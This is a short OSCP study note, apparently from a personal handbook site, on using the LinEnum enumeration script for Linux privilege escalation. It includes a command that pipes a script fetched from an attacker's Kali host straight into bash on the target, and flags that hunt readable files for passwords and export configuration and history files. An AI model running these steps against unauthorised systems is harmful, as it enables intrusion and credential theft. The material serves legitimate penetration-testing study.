---
title: "LinEnum"
slug: linenum
category: notes
handbook: oscp
tags: ["privilege-escalation", "linux"]
draft: false
pubDatetime: 2026-07-19T23:38:46+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "LinEnum is a classic bash privilege-escalation enumeration script."
---
LinEnum is a classic bash privilege-escalation enumeration script. It is older and plainer than [LinPEAS](/collections/oscp/linpeas) or [linux-smart-enumeration](/collections/oscp/linux-smart-enumeration), but still recommended in the OSCP material and useful as a second opinion. Different scripts surface different things, so running more than one is worthwhile when the first pass finds nothing. Run it with the manual checks in [Privilege Escalation](/collections/oscp/privilege-escalation-linux).

## Install

```bash
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh
chmod +x LinEnum.sh
```

## Transfer to the Target

Serve from Kali, fetch on the target, as with any enumeration script:

```bash
# Kali
sudo python3 -m http.server 80
# target
curl http://KALI/LinEnum.sh | bash
```

## Run

```bash
./LinEnum.sh -t                 # thorough: extra, slower checks
./LinEnum.sh -k password        # grep files for a keyword (e.g. password)
./LinEnum.sh -e /tmp/export     # copy interesting files (config, history) to a dir
./LinEnum.sh -s                 # prompt for the current user's password, run sudo checks
```

- `-t`: thorough tests, run unless time is tight.
- `-k <keyword>`: search readable files for a keyword, good for hunting credentials.
- `-e <dir>`: export interesting files for offline review.
- `-s`: supply the current user's password so it can test `sudo`.

Confirm any lead it reports before acting, and work findings in the order set out in [Privilege Escalation](/collections/oscp/privilege-escalation-linux).
